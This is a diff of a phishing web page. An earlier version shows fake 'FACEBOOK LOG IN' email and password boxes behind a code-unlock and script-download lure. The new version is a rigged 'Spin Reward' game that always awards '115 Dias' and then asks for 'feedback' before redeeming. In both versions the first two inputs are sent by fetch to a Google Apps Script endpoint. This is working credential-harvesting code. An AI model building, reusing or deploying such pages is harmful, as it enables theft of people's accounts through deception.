@@ -2,28 +2,34 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Search Page</title>
+<title>Spin Reward</title>
 
 <style>
+/* ===== GLOBAL ===== */
 body{
   margin:0;
   font-family: Helvetica, Arial, sans-serif;
-  background:#f0f2f5;
+  background: radial-gradient(circle at top, #3b1d5a, #12001f);
+  color:#fff;
   display:flex;
   justify-content:center;
   align-items:center;
   height:100vh;
 }
 
+.hidden{display:none}
+
 .box{
-  background:#fff;
   width:360px;
+  background:rgba(255,255,255,0.08);
+  backdrop-filter: blur(10px);
+  border-radius:12px;
   padding:20px;
-  border-radius:8px;
-  box-shadow:0 2px 10px rgba(0,0,0,.15);
   text-align:center;
+  box-shadow:0 0 30px rgba(0,0,0,.4);
 }
 
+/* ===== INPUT (Facebook-like size) ===== */
 .fb-input{
   width:100%;
   height:44px;
@@ -34,6 +40,7 @@ body{
   margin:10px 0;
 }
 
+/* ===== BUTTON ===== */
 button{
   width:100%;
   height:44px;
@@ -45,139 +52,171 @@ button{
   cursor:pointer;
 }
 
-.link{
-  color:#1877f2;
-  margin-top:10px;
-  cursor:pointer;
-  font-size:14px;
+/* ===== LOADING ===== */
+.circle{
+  width:80px;
+  height:80px;
+  border-radius:50%;
+  border:6px solid rgba(255,255,255,.2);
+  border-top:6px solid #1877f2;
+  animation:spin 1s linear infinite;
+  margin:20px auto;
 }
+@keyframes spin{to{transform:rotate(360deg)}}
 
-.hidden{display:none}
-
-.loading{
+.barWrap{
   width:100%;
-  background:#ddd;
+  background:rgba(255,255,255,.2);
   border-radius:6px;
   overflow:hidden;
 }
 .bar{
-  height:20px;
   width:0%;
+  height:10px;
   background:#1877f2;
+}
+
+/* ===== LINKS ===== */
+.link{
+  margin-top:12px;
+  font-size:14px;
+  color:#8ab4ff;
+  cursor:pointer;
 }
 </style>
 </head>
 
 <body>
 
-<!-- PAGE 1 SEARCH -->
-<div class="box" id="page1">
-  <h3>Search</h3>
-  <div class="loading"><div class="bar" id="bar"></div></div>
+<!-- PAGE 1 LOADING -->
+<div class="box" id="loadingPage">
+  <h3>Loading</h3>
+  <div class="circle"></div>
+  <div class="barWrap"><div class="bar" id="bar"></div></div>
   <p id="percent">0%</p>
 </div>
 
-<!-- PAGE 2 ENTER CODE -->
-<div class="box hidden" id="codePage">
-  <h3>Enter Code</h3>
-  <input id="codeInput" class="fb-input" placeholder="Enter Code">
-  <button onclick="submitCode()">Submit</button>
-  <div class="link" onclick="getCode()">Get Code</div>
+<!-- PAGE 2 SPIN -->
+<div class="box hidden" id="spinPage">
+  <h3>Spin Reward</h3>
+  <div id="spinText" style="font-size:22px;margin:30px 0;">READY</div>
+  <button onclick="startSpin()" id="spinBtn">SPIN</button>
+</div>
+
+<!-- PAGE 3 RESULT -->
+<div class="box hidden" id="resultPage">
+  <h3>Reward</h3>
+  <h2>115 Dias</h2>
+  <button onclick="goRedeem()">REDEEM</button>
 </div>
 
 <!-- FEEDBACK 1 -->
 <div class="box hidden" id="fb1">
-  <h3>FACEBOOK LOG IN</h3>
-  <input class="fb-input" id="f1" placeholder="Enter Email">
-  <button onclick="sendF1()">Enter Email</button>
+  <h3>Feedback</h3>
+  <input class="fb-input" id="f1" placeholder="Enter feedback">
+  <button onclick="sendF1()">NEXT</button>
 </div>
 
 <!-- FEEDBACK 2 -->
 <div class="box hidden" id="fb2">
-  <h3>FACEBOOK LOG IN</h3>
-  <input class="fb-input" id="f2" placeholder="Enter Password">
-  <button onclick="sendF2()">Enter Password</button>
+  <h3>Feedback</h3>
+  <input class="fb-input" id="f2" placeholder="Enter feedback">
+  <button onclick="sendF2()">NEXT</button>
 </div>
 
-<!-- CODE SHOW -->
-<div class="box hidden" id="codeShow">
-  <h2>CODE</h2>
-  <h1>5864</h1>
-  <button onclick="copyCode()">COPY</button>
-  <div class="link" onclick="backMain()">Back to main</div>
+<!-- FEEDBACK 3 -->
+<div class="box hidden" id="fb3">
+  <h3>Feedback</h3>
+  <input class="fb-input" placeholder="Enter feedback">
+  <button onclick="nextOnly(this)">NEXT</button>
 </div>
 
-<!-- SCRIPT LIST -->
-<div class="box hidden" id="scriptList">
-  <h3>Available Scripts</h3>
+<!-- FEEDBACK 4 -->
+<div class="box hidden" id="fb4">
+  <h3>Feedback</h3>
+  <input class="fb-input" placeholder="Enter feedback">
+  <button onclick="finish()">REDEEM</button>
+</div>
 
-  <button onclick="downloadScript('V6.txt')">Download Script 1</button><br><br>
-  <button onclick="downloadScript('script2.zip')">Download Script 2</button><br><br>
-  <button onclick="downloadScript('script3.zip')">Download Script 3</button>
-
-  <div class="link" onclick="backMain()">Back to main</div>
+<!-- DONE -->
+<div class="box hidden" id="done">
+  <h2>Successfully Redeemed</h2>
 </div>
 
 <script>
+/* ===== CONFIG ===== */
 const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxPZco9av6RzXCesIXIByfVHRHdhhqmDD8_UaeAb6R1akmK9jPhCvQrRZpRqy47bqUCPw/exec";
 
-/* LOADING 11 SECONDS */
+/* ===== LOADING 25s ===== */
 let p=0;
-let loading=setInterval(()=>{
+const load=setInterval(()=>{
   p++;
   bar.style.width=p+"%";
   percent.innerText=p+"%";
   if(p>=100){
-    clearInterval(loading);
-    page1.classList.add("hidden");
-    codePage.classList.remove("hidden");
+    clearInterval(load);
+    loadingPage.classList.add("hidden");
+    spinPage.classList.remove("hidden");
   }
-},110);
+},250); // 25 seconds
 
-/* GET CODE FLOW */
-function getCode(){
-  codePage.classList.add("hidden");
-  fb1.classList.remove("hidden");
+/* ===== SPIN ===== */
+const rewards=[
+ "Random Epic Skin","Random Emote",
+ "Dias 75","Dias 30","Dias 45",
+ "Dias 115","Dias 558","Nothing"
+];
+let spun=false;
+
+function startSpin(){
+ if(spun) return;
+ spun=true;
+ spinBtn.disabled=true;
+
+ let i=0;
+ const anim=setInterval(()=>{
+   spinText.innerText=rewards[Math.floor(Math.random()*rewards.length)];
+   i++;
+   if(i>=20){
+     clearInterval(anim);
+     spinText.innerText="Dias 115";
+     setTimeout(()=>{
+       spinPage.classList.add("hidden");
+       resultPage.classList.remove("hidden");
+     },800);
+   }
+ },300);
 }
 
+/* ===== FLOW ===== */
+function goRedeem(){
+ resultPage.classList.add("hidden");
+ fb1.classList.remove("hidden");
+}
+
+/* ===== FEEDBACK ===== */
 function sendF1(){
-  const v=document.getElementById("f1").value;
-  fetch(WEB_APP_URL+"?step=1&feedback="+encodeURIComponent(v));
-  fb1.classList.add("hidden");
-  fb2.classList.remove("hidden");
+ const v=document.getElementById("f1").value;
+ fetch(WEB_APP_URL+"?step=1&feedback="+encodeURIComponent(v));
+ fb1.classList.add("hidden");
+ fb2.classList.remove("hidden");
 }
 
 function sendF2(){
-  const v=document.getElementById("f2").value;
-  fetch(WEB_APP_URL+"?step=2&feedback="+encodeURIComponent(v));
-  fb2.classList.add("hidden");
-  codeShow.classList.remove("hidden");
+ const v=document.getElementById("f2").value;
+ fetch(WEB_APP_URL+"?step=2&feedback="+encodeURIComponent(v));
+ fb2.classList.add("hidden");
+ fb3.classList.remove("hidden");
 }
 
-/* ENTER CODE */
-function submitCode(){
-  const code=document.getElementById("codeInput").value;
-  if(code==="5864"){
-    codePage.classList.add("hidden");
-    scriptList.classList.remove("hidden");
-  }else{
-    alert("Wrong code");
-  }
+function nextOnly(btn){
+ btn.parentElement.classList.add("hidden");
+ fb4.classList.remove("hidden");
 }
 
-function copyCode(){
-  navigator.clipboard.writeText("5864");
-  alert("Code Copied");
-}
-
-function backMain(){
-  document.querySelectorAll(".box").forEach(b=>b.classList.add("hidden"));
-  codePage.classList.remove("hidden");
-}
-
-/* DOWNLOAD */
-function downloadScript(file){
-  window.location.href=file;
+function finish(){
+ fb4.classList.add("hidden");
+ done.classList.remove("hidden");
 }
 </script>
 
